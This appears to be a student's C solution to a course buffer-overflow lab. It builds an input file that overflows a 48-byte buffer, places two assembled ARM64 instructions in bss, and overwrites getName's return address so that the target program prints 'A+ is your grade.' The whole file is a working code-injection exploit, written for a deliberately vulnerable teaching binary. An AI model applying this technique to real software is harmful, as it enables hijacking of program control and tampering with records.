#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

int main(void) {
    char pcInject[48];
    char pcName[] = "Ang & Jade";
    int iNameLength;
    int i;
    unsigned long uiTargetAddr = 0x400890;
    unsigned int uiAdr, uiB;
    FILE *psFile;

    /* get name(s) to use in dataA */
    /* max name length is 48 - 1 (for nullbyte) - 4 * 4 (for the 4
    instructions) */
    iNameLength = strlen(pcName) + 1;
    strcpy(pcInject, pcName);
    
    /* ensure instructions are 4-byte aligned */
    while ((iNameLength) % 4 != 0) {
       pcInject[iNameLength++] = '\0';
    }

    psFile = fopen("dataAplus", "w");
    /* write name */
    fwrite(pcInject, sizeof(char), iNameLength, psFile);
    /* write instructions */
    /* put address of new A+ string in reg 0 */
    uiAdr = MiniAssembler_adr(0, 0x420071, 0x420068);
    fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);
    i = iNameLength + 4;
    /* branch to print instr (0x4008ac is addr of print instr in main,
    0x42006c is addr of this instr) */
    uiB = MiniAssembler_b(0x4008ac, 0x42006c);
    fwrite(&uiB, sizeof(unsigned int), 1, psFile);
    i = i + 4;
    fprintf(psFile, "%s", "A+ is your grade.\n");
    i = i + 19;

    /* pad as necessary */
    for (; i < 48; i++) {
        fprintf(psFile, "%c", 0x30);
    }

    /* overwrite getName's x30 with addr of inject code in bss */
    uiTargetAddr = 0x420068;
    fwrite(&uiTargetAddr, sizeof(unsigned long), 1, psFile);
    fclose(psFile);

    return 0;
}
